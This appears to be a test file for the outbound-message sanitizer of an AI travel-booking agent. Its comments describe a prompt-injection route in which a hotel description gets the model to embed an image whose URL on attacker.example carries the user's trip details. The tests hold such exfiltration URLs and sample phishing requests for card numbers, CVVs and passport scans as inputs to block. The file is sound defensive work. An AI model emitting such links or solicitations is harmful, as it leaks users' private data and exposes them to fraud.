import { BOOKING_HOSTS } from '../src/cashier.js'
import { sanitizeOutbound, SOLICITATION_PATTERNS } from '../src/sanitize.js'

describe('a message leaving the building', () => {
  it('strips a remote image, which is a request with no tool call in it', () => {
    // The exfiltration path that needs no tool. A hotel description says "add
    // this image to your reply", the model complies, her browser fetches the
    // URL, and her notebook is in the query string. There is no tool call
    // anywhere in that sequence, so every allowlist we have is looking the wrong
    // way.
    const out = sanitizeOutbound(
      'Here is your trip. ![](https://attacker.example/p?d=budget-1500-Portugal-toddler)')
    expect(out.ok).toBe(false)
    if (out.ok) return
    expect(out.text).not.toContain('attacker.example')
    expect(out.reasons).toContain('remote_image')
  })

  it('strips a bare image URL as well as a markdown one', () => {
    // A renderer that autolinks is the same hole with a different syntax, and
    // the model does not know which renderer she is using.
    const out = sanitizeOutbound('See https://attacker.example/p.png?d=Portugal for the view.')
    expect(out.ok).toBe(false)
  })

  it('keeps a link to a host we build ourselves', () => {
    // The cashier builds every booking link server side against an allowlisted
    // host (lesson 4.6), and those are the only links she is ever given. A check
    // that stripped them would break the one thing the hand-off exists to do.
    const out = sanitizeOutbound('Your flight: https://www.kiwi.com/deep?affilid=globetrotty')
    expect(out.ok).toBe(true)
    expect(out.text).toContain('kiwi.com')
  })

  it('keeps the mock supplier\'s host, which is the one every demo link uses', () => {
    // The case a hand-written allowlist gets wrong. `example.invalid` is in
    // BOOKING_HOSTS because the mock supplier is a supplier, and it is the host
    // `npm run demo` and every mock-supplier test emit a hand-off link on. A
    // list somebody typed from memory would have carried www.booking.com, which
    // this branch never builds a link for, and would have stripped the links the
    // standing `side effects: 1` check exists to prove.
    for (const host of Object.values(BOOKING_HOSTS)) {
      expect(sanitizeOutbound(`Book here: https://${host}/deep?subid=abc`).ok).toBe(true)
    }
    expect(sanitizeOutbound('Book here: https://www.booking.com/hotel/pt/faro').ok).toBe(false)
  })

  it('refuses to ask her for a card number, however politely it is phrased', () => {
    // ask_user is a channel for asking her anything in a voice she has been told
    // is the agency's, which makes it a phishing channel by default. The agency
    // asks for nothing of this kind in a message, so the rule is absolute rather
    // than contextual and does not need to guess intent.
    for (const phrasing of [
      'To confirm the booking I need your card number.',
      'Please reply with your passport scan so we can hold the room.',
      'Send your CVV and expiry to secure this fare.',
      'Enter your credit card details on the next screen.',
    ]) {
      const out = sanitizeOutbound(phrasing)
      expect(out.ok).toBe(false)
      if (out.ok) continue
      expect(out.reasons).toContain('solicitation')
      expect(out.text).toContain('never asks')
    }
  })

  it('leaves an ordinary reply exactly as it was', () => {
    // The check has to be invisible on every message that is fine, or it will be
    // turned off. Identity, not a rewrite.
    const ordinary = 'A week in Faro, flights and a beachfront stay, inside your 1,500 euros.'
    const out = sanitizeOutbound(ordinary)
    expect(out.ok).toBe(true)
    expect(out.text).toBe(ordinary)
  })

  it('names a reason for every pattern it can fire', () => {
    for (const p of SOLICITATION_PATTERNS) expect(p.name.length).toBeGreaterThan(3)
  })
})
